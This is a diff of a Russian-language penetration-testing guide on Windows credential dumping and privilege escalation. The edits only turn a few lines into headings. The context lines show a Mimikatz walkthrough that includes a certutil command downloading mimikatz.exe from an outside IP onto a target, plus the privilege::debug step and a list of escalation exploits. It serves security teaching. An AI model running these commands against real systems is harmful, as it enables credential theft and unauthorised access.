@@ -40,12 +40,12 @@ findstr — команда для поиска строк в файлах
 В Windows для реализации механизма HTTP Digest Authentication для поддержки SSO (Single Sign On) требуют знание вводимого пароля, а не только его хеша. Поэтому разработчики Windows решили хранить пароли пользователей в открытом виде. Для извлечения паролей и хешей из оперативной памяти можно использовать инструмент Mimikatz.
 
 
-Mimikatz — инструмент, реализующий функционал Windows Credentials Editor и позволяющий извлекать учетные данные пользователей Windows.
+# Mimikatz — инструмент, реализующий функционал Windows Credentials Editor и позволяющий извлекать учетные данные пользователей Windows.
 Дополнительную информацию по данному инструменту можно получить по следующим ссылкам:
 • Что такое Mimikatz: руководство для начинающих — https://habr.com/ru/company/varonis/blog/539340/
 •  Справка по mimikatz — https://kali.tools/?p=5342
 
-Применение Mimikatz
+# Применение Mimikatz
 •  Для загрузки инструмента mimikatz необходимо перейти в папку с правами на запись, например в C:\Windows\System32\spool\drivers\color.
 •  Далее следует загрузить mimikatz на целевую машину. Это можно сделать утилитой, позволяющей скачивать файл по сети certutil: certutil -urlcache -split -f http://10.10.14.16/mimikatz.exe m.exe
 •  После запуска Mimi нужно указать следующую команду, которая предоставит текущей учетной записи права отладки процессов (SeDebugPrivilege): privilege::debug
@@ -77,11 +77,11 @@ Mimikatz — инструмент, реализующий функционал 
 • Обработка вторичного входа в систему (MS16-032)
 
 
-Рекомендуемые ресурсы
+# Рекомендуемые ресурсы
 • Hacktrics: https://book.hacktricks.xyz/windows-hardening/windows-local-privilege-escalation
 • Стандарт по тестированию на проникновение PTES
 
-Active Directory:
+# Active Directory:
 • Чеклист по тестированию защищенности Active Directory: 
 https://book.hacktricks.xyz/windows-hardening/active-directory-methodology
 • Эксплуатация Zerologon: 
